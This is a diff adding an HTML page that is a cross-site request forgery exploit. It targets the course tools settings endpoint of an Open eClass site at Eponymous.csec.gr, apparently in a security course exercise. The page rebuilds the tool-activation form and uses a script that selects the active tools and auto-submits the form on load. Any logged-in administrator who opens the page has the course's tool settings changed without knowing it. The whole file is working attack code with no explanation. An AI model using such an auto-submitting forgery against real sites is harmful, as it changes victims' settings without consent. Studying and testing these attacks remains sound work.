@@ -1,0 +1,66 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/course_tools/course_tools.php' method='post'>
+ <table class="FormData" align="center" width="99%" style="border: 1px solid #CAC3B5;">
+   <thead>
+   <tr>
+     <td width="45%" style="color: #a33033;"><div align="center"><b>Ανενεργά εργαλεία<b></div></td>
+     <td width="10%" style="color: #727266;"><div align="center"><b>Μετακίνηση<b></div></td>
+     <td width="45%" style="color: green;"><div align="center"><b>Ενεργά εργαλεία<b></div></td>
+   </tr>
+   <tr>
+     <td><div align="center">
+         <select name="toolStatInactive[]" size=17 multiple class='FormData_InactiveTools'>
+         </select>
+         </div>
+     </td>
+     <td><div align="center">
+         <input type="button" onClick="move(this.form.elements[0],this.form.elements[3])" value="   >>   " /><br/>
+         <input type="button" onClick="move(this.form.elements[3],this.form.elements[0])" value="   <<   " />
+         </div>
+     </td>
+     <td><div align="center">
+         <select name="toolStatActive[]" size="17" multiple class='FormData_ActiveTools'>
+         <option value="16">Ανταλλαγή Αρχείων</option>
+         <option value="5">Εργασίες</option>
+         <option value="15">Ομάδες Χρηστών</option>
+         <option value="9">Περιοχές Συζητήσεων</option>
+         <option value="19">Τηλεσυνεργασία</option>
+         <option value="7">Ανακοινώσεις</option>
+         <option value="10">Ασκήσεις</option>
+         <option value="1">Ατζέντα</option>
+         <option value="4">Βίντεο</option>
+         <option value="23">Γραμμή Μάθησης</option>
+         <option value="3">Έγγραφα</option>
+         <option value="21">Ερωτηματολόγια</option>
+         <option value="20">Περιγραφή Μαθήματος</option>
+         <option value="2">Σύνδεσμοι</option>
+         <option value="26">Σύστημα Wiki</option>
+         </select>
+         </div>
+     </td>
+   </tr>
+   <tr>
+     <td>&nbsp;</td>
+     <td><div align="center">
+         <input type="text" value="Υποβολή αλλαγών"  name="toolStatus">
+         </div>
+         </td>
+     <td>&nbsp;</td>
+   </tr>
+   </thead>
+   </table>
+
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    function selectAll(cbList,bSelect) {
+      for (var i=0; i<cbList.length; i++)
+        cbList[i].selected = cbList[i].checked = bSelect
+    }
+
+
+    var form = document.querySelector("#csrf_form");
+    selectAll(form.elements[3],true);
+    HTMLFormElement.prototype.submit.call(form);
+</script>
